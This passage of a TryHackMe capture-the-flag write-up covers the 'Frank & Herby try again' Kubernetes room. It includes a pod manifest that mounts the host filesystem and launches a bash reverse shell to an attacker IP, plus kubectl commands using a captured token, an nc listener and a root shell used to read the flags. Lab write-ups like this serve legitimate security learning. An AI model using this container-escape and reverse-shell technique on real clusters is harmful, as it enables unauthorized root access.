      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
...
    - hostPath:
        path: /home/herby/app
        type: Directory
      name: frank
    - name: kube-api-access-tq4f4
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
...
      image: docker.io/vulhub/php:8.1-backdoor
...
```

<br>

```bash
root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods -n frankland
<vtcg:/var/www/html# ./kubectl get pods -n frankland
NAME                          READY   STATUS        RESTARTS      AGE
php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (91d ago)   3y199d
php-deploy-6d998f68b9-fvtcg   1/1     Running       0             65m
```

<br>
<p align="center">Created <em>rosana.yaml</em> substituting some parameters of the penultimate step output.</p>

```bash
apiVersion: v1
kind: Pod
metadata:
  name: rosana
  namespace: default
spec:
  containers:
  - name: rosana
    image: vulhub/php:8.1-backdoor
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/xx.xxx.xxx.xx/1337 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

<br>
<br>

```bash
:~/FrankandHerbyTryAgain# ~# ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token apply -f rosana.yaml
pod/rosana created
```

<br>
<br>

```bash
:~/FrankandHerbyTryAgain# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on xx.xxx.xx.xx 38002
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-xx-xxx-xx-xx:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
```

<br>

```bash
root@ip-xx-xxx-xx-xx:/var/www/html# cd /mnt
cd /mnt
```

```bash
root@ip-xx-xxx-xx-xx:/mnt# cd /home
cd /home
```

```bash
root@ip-xx-xxx-xx-xx:/# cd /root
cd /root
```

```bash
root@ip-xx-xxx-xx-xx:~# ls
ls
```

```bash
root@ip-xx-xxx-xx-xx:~# cd ..
cd ..
```

```bash
root@ip-xx-xxx-xx-xx:/# find / type -name user.txt 2>/dev/null
find / type -name user.txt 2>/dev/null
/mnt/home/herby/user.txt
```

```bash
root@ip-xx-xxx-xx-xx:/#  cat /mnt/home/herby/user.txt
cat /mnt/home/herby/user.txt
THM{*-******-****-*****}
```

<br>

<p>1.1. <em><strong>User</strong> flag?</em><br>
<strong>THM{*-******-****-*****}</strong></p>
<br>

<br>
<br>
<h1 align="center">Privilege Escalation & Root Flag<a id='9'></a></h1>
<p align="center">I should have performed the following steps before ...<br>Installed <strong>Kubeletctl</strong> following the instructions <a href="https://github.com/cyberark/kubeletctl">here</a><br>Used <strong>Kubeletctl</strong> to check for pods and namespaces<br>Identified <strong>frankland</strong></p>

```bash
:~/FrankandHerbyTryAgain# kubeletctl pods -s xx.xxx.xx.xx --http --port 10255
```

<p><img width="1200px" src="https://github.com/user-attachments/assets/8a36c602-9734-45ec-b4a0-abff22873504"></p>

<br>
<br>
<br>

<p align="center">Enumerated <strong>frankland</strong>.</p>

```bash
:~/FrankandHerbyTryAgain#   ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get deployments -n frankland
NAME         READY   UP-TO-DATE   AVAILABLE   AGE
php-deploy   1/1     1            1           3y199d
```

<br>

```bash
:~/FrankandHerbyTryAgain#  ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get services -n frankland
NAME         TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
php-deploy   NodePort   xx.xxx.xxx.xxx   <none>        80:30679/TCP   3y199d
```

<br>

```bash
:~/FrankandHerbyTryAgain#  ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get pods -n frankland
NAME                          READY   STATUS        RESTARTS      AGE
php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (91d ago)   3y199d
php-deploy-6d998f68b9-fvtcg   1/1     Running       0             132m
```

<br>

```bash
:~/FrankandHerbyTryAgain# ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get nodes
NAME              STATUS     ROLES    AGE      VERSION
microk8s          NotReady   <none>   3y200d   v1.23.17-2+40cc20cc310518
ip-xx-xxx-xx-xx   Ready      <none>   138m     v1.23.17-2+40cc20cc310518
```

<p><img width="1200px" src="https://github.com/user-attachments/assets/7218af65-dacd-48eb-8efb-fe23ba1db827"></p>

<br>
<br>
<br>

```bash
root@ip-xx-xxx-xx-xx:/#  find / type -name root.txt 2>/dev/null
find / type -name root.txt 2>/dev/null
/mnt/root/root.txt
```

```bash
root@ip-xx-xxx-xx-xx:/# cat /mnt/root/root.txt
cat /mnt/root/root.txt
THM{*****-***-*****-*****-****}
```

<br>
<p>1.2. <em><strong>Root</strong> flag?</em><br>
<strong>THM{*****-***-*****-*****-****}</strong></p>
  <br>
<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9c47363a-58e9-445f-b589-17ffbb916718"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/081c3915-1938-4c43-a909-82a242f8e465"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>
<br>

<p align="center">Global All Time:   106ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/98f604de-2a21-4d2d-811d-e547f0f8dca8"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/969a8da8-79f9-4d76-aab8-8a6cb7cb58f6"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/1f0c19ee-7f87-4fb8-8da5-c7b5c71d12c1"><br>
                  Global monthly:     300ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d28a9ffe-4532-4c4d-b043-5e9cf63a9b28"><br>
                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a13ac859-b761-4e37-95b1-ad18cc718440"><br>


<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
